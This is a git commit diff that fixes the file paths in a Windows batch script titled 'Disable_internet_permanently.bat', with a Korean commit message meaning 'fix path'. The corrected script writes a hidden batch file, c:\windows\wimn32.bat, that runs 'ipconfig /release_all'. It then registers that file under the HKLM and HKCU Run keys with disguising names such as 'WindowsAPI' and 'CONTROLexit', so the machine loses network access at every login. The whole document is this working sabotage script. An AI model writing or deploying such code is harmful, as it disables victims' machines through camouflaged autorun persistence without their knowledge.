e21fba58e6d35a7d576e7100847fef44042d6adf
조세영 | Jo Seyeong <6127878@naver.com>
2024-10-01 11:31:20 +0900

    경로 수정

--- Disable_internet_permanently.bat
+++ Disable_internet_permanently.bat
@@ -1,7 +1,11 @@
-echo @echo off>c:\windowswimn32.bat
-echo break off>>c:\windowswimn32.bat
-echo ipconfig/release_all>>c:\windowswimn32.bat
-echo end>>c:\windowswimn32.bat
-reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun/vWindowsAPI/t reg_sz/d c:windowswimn32.bat /f
-reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun/vCONTROLexit/t reg_sz/d c:windowswimn32.bat /f
+:: 관리자 권한 필요
+@echo off
+echo @echo off >> c:\windows\wimn32.bat
+echo break off >> c:\windows\wimn32.bat
+echo ipconfig/release_all>>c:\windows\wimn32.bat
+echo end >> c:\windows\wimn32.bat
+
+reg add hkey_local_machine\software\microsoft\windows\currentversion\run /v WindowsAPI /t reg_sz /d c:\windows\wimn32.bat /f
+reg add hkey_current_user\software\microsoft\windows\currentversion\run /v CONTROLexit /t reg_sz /d c:\windows\wimn32.bat /f
+
 PAUSE
